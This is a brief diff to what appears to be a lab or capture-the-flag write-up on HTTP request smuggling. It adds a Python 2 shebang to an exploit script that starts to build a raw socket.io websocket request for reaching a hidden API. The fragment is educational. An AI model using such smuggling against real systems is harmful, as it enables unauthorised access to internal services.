@@ -6,6 +6,7 @@
  This one is a more difficult variant of HTTP request smuggling. To access the target API and Page in the hidden network we need to write an Exploit. You can use the one below (with Python2...pain or gain)
 
   ```python
+  #!/usr/bin/env python2
   import socket 
 
   req1 = """GET /socket.io/?EIO=3&transport=websocket HTTP/1.1
